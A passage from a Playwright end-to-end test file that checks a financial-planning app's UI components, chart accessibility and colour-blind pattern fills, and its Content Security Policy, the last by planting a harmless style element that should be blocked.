    // The Action Items tray on the laptop: the handle opens it under the panel; a changed figure wears its mark.
    const handle = page.getByRole('button', { name: 'Action items' })
    await handle.click()
    await expect(handle).toHaveAttribute('aria-expanded', 'true')
    const tray = page.locator('[data-tray]')
    await expect(tray).toBeVisible()
    await expect(tray.getByText('Monthly spending in retirement').first()).toBeVisible()
    const spend = tray.getByLabel('Monthly spending in retirement')
    await spend.fill('5,000')
    await spend.press('Enter')
    await expect(spend.locator('xpath=..')).toHaveAttribute('data-changed', 'true')
    await handle.click()
    await expect(tray).toHaveCount(0)

    // …and on the phone, a full-height sheet with its own close.
    await page.setViewportSize({ width: 390, height: 844 })
    await handle.click()
    const sheet = page.getByRole('dialog', { name: 'Action items' })
    await expect(sheet).toBeVisible()
    await sheet.getByRole('button', { name: 'Close the action items' }).click()
    await expect(sheet).toHaveCount(0)
    await expect(handle).toHaveAttribute('aria-expanded', 'false')
    await page.setViewportSize({ width: 1280, height: 720 })

    // ScrollArea: it scrolls, and its native scrollbar is hidden by OUR rule (Base UI's own <style> is switched off).
    const viewport = page.locator('[aria-label="Probe lines"]')
    const scroll = await viewport.evaluate((el) => {
      el.scrollTop = 60
      return { top: el.scrollTop, cls: el.classList.contains('base-ui-disable-scrollbar'), sw: getComputedStyle(el).scrollbarWidth }
    })
    expect(scroll.top, 'the scroll area did not scroll').toBeGreaterThan(0)
    expect(scroll.cls, 'Base UI no longer tags its viewport with base-ui-disable-scrollbar').toBe(true)
    expect(scroll.sw, 'theme.css’s .base-ui-disable-scrollbar rule did not apply').toBe('none')

    // The kit's TanStack table: a grouped header (two header rows) over four body rows, a negative in parentheses.
    const table = page.locator('[data-probe="table"] table')
    await expect(table.locator('thead tr')).toHaveCount(2)
    await expect(table.locator('thead tr').first().locator('th', { hasText: 'Income' })).toHaveAttribute('colspan', '2')
    await expect(table.locator('tbody tr')).toHaveCount(4)
    await expect(table.locator('tbody tr').first().locator('td').last()).toHaveText('(36,000)')

    // The chart: drawn, with the accessibility module's hidden screen-reader region and the credit.
    const chart = page.locator('.highcharts-container')
    await expect(chart.locator('.highcharts-series.highcharts-series-1 .highcharts-point')).toHaveCount(4)
    await expect(page.locator('[id^="highcharts-screen-reader-region-before-"]'), 'the accessibility module drew no screen-reader region').toBeAttached()
    await expect(page.locator('.highcharts-a11y-proxy-group-legend .highcharts-a11y-proxy-element'), 'no keyboard proxy for each legend item').toHaveCount(3)
    await expect(chart.locator('.highcharts-credits')).toHaveText('Highcharts.com')

    // Hover a point until its tooltip shows.
    await chart.locator('.highcharts-series.highcharts-series-0 .highcharts-point').nth(2).hover()
    await expect(chart.locator('.highcharts-tooltip')).toBeVisible()
    await expect(chart.locator('.highcharts-tooltip')).toContainText('Solid series')

    // Click a legend item to hide its series, then again to show it.
    const legendItem = chart.locator('.highcharts-legend-item.highcharts-series-1')
    await legendItem.click()
    await expect(legendItem).toHaveClass(/highcharts-legend-item-hidden/)
    await legendItem.click()
    await expect(legendItem).not.toHaveClass(/highcharts-legend-item-hidden/)

    // The cascade (a new kind of check): the colour-blind second cue survives highcharts.css and the default palette.
    const fills = await page.evaluate(() => {
      const fill = (sel: string) => {
        const el = document.querySelector(sel)
        return el ? getComputedStyle(el).fill : 'MISSING'
      }
      return {
        hatched: fill('.highcharts-series.highcharts-series-1 .highcharts-point'),
        hatchedLegend: fill('.highcharts-legend-item.highcharts-series-1 .highcharts-point'),
        solid: fill('.highcharts-series.highcharts-series-0 .highcharts-point'),
        root: getComputedStyle(document.documentElement).getPropertyValue('--highcharts-color-0').trim(),
        pattern: document.querySelectorAll('pattern#b9-hatch').length,
        // RC3 (owed from RC1): each pattern kind's own ink, so two patterned series keep their colour difference.
        hatchInk: (() => {
          const el = document.querySelector('pattern#b9-hatch .b9-pattern-ink')
          return el ? getComputedStyle(el).stroke : 'MISSING'
        })(),
        dotsInk: (() => {
          const el = document.querySelector('pattern#b9-dots .b9-pattern-ink')
          return el ? getComputedStyle(el).fill : 'MISSING'
        })(),
        dotted: fill('.highcharts-series.highcharts-series-2 .highcharts-point'),
      }
    })
    // Imported here, not at the top, so the lines this file's other arms are cited by keep their numbers.
    const { RC_SERIES } = await import('../src/viz/palette')
    const hex = RC_SERIES[0]
    const rgb = `rgb(${parseInt(hex.slice(1, 3), 16)}, ${parseInt(hex.slice(3, 5), 16)}, ${parseInt(hex.slice(5, 7), 16)})`
    expect(fills.pattern, 'the shared defs built no #b9-hatch pattern into the chart').toBeGreaterThan(0)
    expect(fills.hatched, 'the hatched series lost its pattern fill').toBe('url("#b9-hatch")')
    expect(fills.hatchedLegend, 'the hatched series’ legend symbol lost its pattern fill').toBe('url("#b9-hatch")')
    expect(fills.root, 'the CSSOM write of --highcharts-color-0 did not land').toBe(hex)
    expect(fills.solid, 'series 0 is not painted from palette.ts (highcharts.css or its default palette won)').toBe(rgb)
    // Two patterned series in one chart: each pattern's ink computes its own series' colour, never one shared ink.
    const rgbOf = (h: string) => `rgb(${parseInt(h.slice(1, 3), 16)}, ${parseInt(h.slice(3, 5), 16)}, ${parseInt(h.slice(5, 7), 16)})`
    expect(fills.dotted, 'the dotted series lost its pattern fill').toBe('url("#b9-dots")')
    expect(fills.hatchInk, 'the hatch’s ink is not its series’ colour (slot 1)').toBe(rgbOf(RC_SERIES[1]))
    expect(fills.dotsInk, 'the dots’ ink is not its series’ colour (slot 2)').toBe(rgbOf(RC_SERIES[2]))
    expect(fills.hatchInk, 'two patterned series in one chart share one ink').not.toBe(fills.dotsInk)

    // Nothing injected a <style> element, and nothing was blocked along the way.
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'a library injected a <style> element').toBe(0)
    expect(await violations(page)).toEqual([])
    expect(outside, 'a request left the build’s own origin').toEqual([])
  })

  /** The probe arm's own control (insight 016): on the probe page, a planted `<style>` is BLOCKED on the enforced origin
   *  and APPLIES on the no-CSP control origin, so "no violation" above is a real reading, never a deaf collector. */
  test('the kit probe: a planted <style> is blocked under the CSP (style-src) …', async ({ page }) => {
    await installCollector(page)
    await page.goto('/kit-probe.html')
    await expect(page.getByRole('heading', { name: 'Kit probe' })).toBeVisible()
    expect(await plantStyle(page), 'the planted <style> applied under the enforced CSP').toBe(false)
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('style-src'))).toBe(true)
  })

  test('CONTROL: … and the same planted <style> applies on the kit probe when no CSP is served', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/kit-probe.html`)
    await expect(page.getByRole('heading', { name: 'Kit probe' })).toBeVisible()
    expect(await plantStyle(page), 'the planted <style> did not apply with no CSP — the plant is broken').toBe(true)
    expect(await violations(page)).toHaveLength(0)
  })
})

/** Appends a `<style>` that would give the probe's heading a 7 px outline; true when the rule took effect. */
async function plantStyle(page: Page): Promise<boolean> {
  return page.evaluate(async () => {
    const s = document.createElement('style')
    s.textContent = 'h1 { outline: 7px solid currentcolor !important; }'
    document.head.appendChild(s)
    await new Promise((r) => requestAnimationFrame(() => r(null)))
    const h1 = document.querySelector('h1')
    return h1 !== null && getComputedStyle(h1).outlineWidth === '7px'
  })
}
